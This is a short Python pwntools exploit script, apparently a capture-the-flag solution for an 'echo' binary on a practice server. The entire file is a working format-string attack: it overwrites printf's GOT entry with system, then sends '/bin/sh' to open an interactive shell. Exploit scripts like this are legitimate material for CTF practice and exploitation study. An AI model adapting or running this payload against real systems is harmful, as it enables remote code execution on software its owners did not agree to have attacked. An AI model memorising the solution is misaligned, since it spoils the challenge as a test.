# -*- coding: utf-8 -*-

#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'Flyour'

from pwn import *

def debug(addr='0x08048658'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)


context(terminal=['gnome-terminal', '-x', 'sh', '-c'], arch='i386', os='linux', log_level='debug')


shellcode = "/bin/sh\0"

elf = ELF('./echo')


io = process('./echo')
#io = remote('hackme.inndy.tw', 7711)

printf_got_addr = elf.got['printf']
print "print_got_addr: %x" % printf_got_addr
system_plt_addr = elf.got['system']
print "system_plt_addr: %x" % system_plt_addr

payload = fmtstr_payload(7, {printf_got_addr: system_plt_addr})
print payload

#debug()

io.sendline(payload)
io.sendline(shellcode)

io.interactive()
io.close()
